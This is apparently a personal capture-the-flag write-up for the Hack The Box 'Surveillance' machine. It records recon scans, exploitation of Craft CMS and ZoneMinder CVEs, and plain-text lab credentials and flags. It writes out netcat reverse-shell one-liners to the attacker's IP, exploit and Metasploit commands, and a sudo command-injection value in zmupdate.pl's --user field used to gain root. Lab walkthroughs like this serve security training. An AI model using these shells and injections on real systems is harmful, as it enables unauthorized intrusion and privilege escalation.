# Surveillance
- HTB, Linux machine, medium 
- Target IP: 10.10.11.245
## 01- Information Gathering
### Ping 
**Live host status scan**
```bash
─❯ ping -c 1 10.10.11.245
PING 10.10.11.245 (10.10.11.245) 56(84) bytes of data.
64 bytes from 10.10.11.245: icmp_seq=1 ttl=63 time=28.0 ms

--- 10.10.11.245 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 28.046/28.046/28.046/0.000 ms
```
![[Pasted image 20231211120349.png]]
- Target alive
- TTL=63 (most be linux) 

---
### Nmap
**Network and port scan**
```bash                                       
╰─❯ nmap -A -p 1-65535 10.10.11.245 -oN nmap.txt
Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-11 12:05 EST
Nmap scan report for 10.10.11.245
Host is up (0.040s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b (ECDSA)
|_  256 0b:a4:c0:cf:e2:3b:95:ae:f6:f5:df:7d:0c:88:d6:ce (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://surveillance.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.31 seconds
```
![[Pasted image 20231211120630.png]]
#### Port
80/tcp open  nginx 1.18.0 (Ubuntu)

```bash
gobuster dir -u http://surveillance.htb/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x .php,.html.txt.zip
```

```
/.gitkeep
/.htaccess
/admin/admin/login
/admin/login
/index
/index.php.
/web.config
```

### Nikto
- craft CMS version? it's vulnerable??
![[Pasted image 20231212090042.png]]
### Source View
```php
  <!-- footer section -->
  <section class="footer_section">
    <div class="container">
      <p>
        &copy; <span id="displayYear"></span> All Rights Reserved By
        SURVEILLANCE.HTB</a><br> <b>Powered by <a href="[https://github.com/craftcms/cms/tree/4.4.14](view-source:https://github.com/craftcms/cms/tree/4.4.14)"/>Craft CMS</a></b>
      </p>
    </div>
  </section>
```
![[Pasted image 20231213103606.png]]
- Search for Craft CME 4.4.14 vulnerability/exploit..
- Find the [CVE-2023-41892](https://www.cvedetails.com/cve/CVE-2023-41892/ "CVE-2023-41892 security vulnerability details")
- python RCE script from https://gist.github.com/to016/b796ca3275fa11b5ab9594b1522f7226

```sh
╰─❯ python3 poc.py http://surveillance.htb/
[-] Get temporary folder and document root ...
[-] Write payload to temporary file ...
[-] Trigger imagick to write shell ...
[-] Done, enjoy the shell
$ pwd
/var/www/html/craft/web/cpresources
$ ps -aux
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
www-data     830  0.0  0.0   6280  1524 ?        Ss   16:29   0:00 /usr/sbin/fcgiwrap -f
www-data    1139  0.0  0.1  66256  5720 ?        S    16:29   0:00 nginx: worker process
www-data    1140  0.0  0.1  66520  6860 ?        S    16:29   0:00 nginx: worker process
www-data    1318  0.0  0.0   2888   992 ?        S    16:37   0:00 sh -c ps -aux
www-data    1319  0.0  0.0   7352  3344 ?        R    16:37   0:00 ps -aux

```
![[Pasted image 20231215114254.png]]
- use  "bin/sh" to get more stable shell 
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.21 1234 >/tmp/f
```
- start listener on host 
```bash
─❯ nc -lnvp 1234
listening on [any] 1234 ...
connect to [10.10.14.21] from (UNKNOWN) [10.10.11.245] 47112
/bin/sh: 0: can't access tty; job control turned off
```
![[Pasted image 20231215114317.png]]
- upgrade the shell once with python3
```bash
python3 -c 'import pty;pty.spawn ("/bin/bash")'
```

```bash
www-data@surveillance:~/html/craft/storage/backups$ python3 -m http.server
python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.14.21 - - [15/Dec/2023 17:22:12] "GET /surveillance--2023-10-17-202801--v4.4.14.sql.zip HTTP/1.1" 200 -
```
![[Pasted image 20231215123031.png]]

```bash
─❯ unzip surveillance--2023-10-17-202801--v4.4.14.sql.zip
Archive:  surveillance--2023-10-17-202801--v4.4.14.sql.zip
  inflating: surveillance--2023-10-17-202801--v4.4.14.sql  
```
![[Pasted image 20231215123241.png]]

![[Pasted image 20231215123003.png]]
```bash
39ed84b22ddc63ab3725a1820aaa7f73a8f3f10d0848123562c9f35c675770ec
```
- hash ID + dehasher 


**Username: Matthew
Password: starcraft122490

```bash
╰─❯ ssh matthew@surveillance.htb                    
The authenticity of host 'surveillance.htb (10.10.11.245)' can't be established.
ED25519 key fingerprint is SHA256:Q8HdGZ3q/X62r8EukPF0ARSaCd+8gEhEJ10xotOsBBE.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'surveillance.htb' (ED25519) to the list of known hosts.
matthew@surveillance.htb's password: 
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-89-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri Dec 15 08:17:59 PM UTC 2023

  System load:  0.0830078125      Processes:             266
  Usage of /:   84.8% of 5.91GB   Users logged in:       1
  Memory usage: 22%               IPv4 address for eth0: 10.10.11.245
  Swap usage:   0%


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Tue Dec  5 12:43:54 2023 from 10.10.14.40
matthew@surveillance:~$ 

```
![[Pasted image 20231215151824.png]]

```bash
matthew@surveillance:~$ ls
linpeas.sh  user.txt
matthew@surveillance:~$ cat user.txt
cd2de0bce245efba14e94ada7fa4cbe1
matthew@surveillance:~$ 
```

![[Pasted image 20231215151942.png]]

```bash
/tmp/tmux-1000
╔══════════╣ Analyzing Keyring Files (limit 70)
drwxr-xr-x 2 root root 4096 Apr  8  2022 /etc/apt/keyrings
drwxr-xr-x 2 root root 4096 Dec  5 12:34 /usr/share/keyrings




╔══════════╣ Analyzing Backup Manager Files (limit 70)
-rw-r--r-- 1 root zoneminder 5265 Nov 18  2022 /usr/share/zoneminder/www/ajax/modals/storage.php
-rw-r--r-- 1 root zoneminder 1249 Nov 18  2022 /usr/share/zoneminder/www/includes/actions/storage.php

-rw-r--r-- 1 root zoneminder 3503 Oct 17 11:32 /usr/share/zoneminder/www/api/app/Config/database.php
		'password' => ZM_DB_PASS,
		'database' => ZM_DB_NAME,
		'host' => 'localhost',
		'password' => 'ZoneMinderPassword2023',
		'database' => 'zm',
				$this->default['host'] = $array[0];
			$this->default['host'] = ZM_DB_HOST;
-rw-r--r-- 1 root zoneminder 11257 Nov 18  2022 /usr/share/zoneminder/www/includes/database.php

╔══════════╣ Searching uncommon passwd files (splunk)
passwd file: /etc/pam.d/passwd
passwd file: /etc/passwd
passwd file: /usr/share/bash-completion/completions/passwd
passwd file: /usr/share/lintian/overrides/passwd

╔══════════╣ Analyzing Github Files (limit 70)
drwx
```

```bash
matthew@surveillance:/usr/share/zoneminder/www/api/app/Config$ cat * | grep -i version
Configure::write('ZM_VERSION', '1.36.32');
Configure::write('ZM_API_VERSION', '1.36.32.1');
 * for instance. Each version can then have its own view cache namespace.
 *    value to false, when dealing with older versions of IE, Chrome Frame or certain web-browsing devices and AJAX
 * for instance. Each version can then have its own view cache namespace.
 *    value to false, when dealing with older versions of IE, Chrome Frame or certain web-browsing devices and AJAX
```

![[Pasted image 20231216085019.png]]
- CVE-2023-26035
```bash
git clone https://github.com/rvizx/CVE-2023-26035.git
cd CVE-2023-26035
python3 exploit.py
```


```bash
#kali
❯ python3 exploit.py -t http://127.0.0.1:2222 -ip 10.10.14.21  -p 7777
[>] fetching csrt token
[>] recieved the token: key:40e49ee331b9a7b0d26961cec71562a8b445b0a1,1702735101
[>] executing...
[>] sending payload..
[>] payload sent
```
```bash
#targets
matthew@surveillance:~$ nc -lvnp 7777
Listening on 0.0.0.0 7777
```
![[Pasted image 20231216090016.png]]


msfconsole exploit(unix/webapp/zoneminder_snapshots)
set rport 8080 
set rhost 127.0.0.1 
set lhost 10.10.14.21
set targeturi / 
exploit

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.21 1234 >/tmp/f

run this to gain ROOT

```
sudo /usr/bin/zmupdate.pl --version=1 --user='$(/tmp/rev1.sh)'
```


9753f0e1c592fb691978f9ba062a9219